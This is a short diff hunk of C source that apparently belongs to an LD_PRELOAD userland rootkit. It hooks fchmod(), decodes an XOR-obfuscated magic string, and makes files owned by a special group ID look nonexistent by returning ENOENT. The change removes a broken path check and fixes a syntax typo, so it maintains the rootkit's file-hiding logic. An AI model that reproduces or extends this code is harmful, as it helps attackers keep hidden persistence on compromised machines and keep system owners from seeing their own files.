@@ -929,13 +929,13 @@ int fchmod(int fd, mode_t mode)
 	old___fxstat(_STAT_VER, fd, &filestat); 
 	if (owned()) return old_fchmod(fd, mode); 
 	char *magic = strdup(MAGIC); xor(magic); 
-	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
+	if (filestat.st_gid == MAGICGID)
 	{ 
 		CLEAN(magic); 
 		errno = ENOENT; 
 		return -1; 
 	} 
-	CLEAN(magic): 
+	CLEAN(magic);  
 	return old_fchmod(fd, mode); 
 }	
 
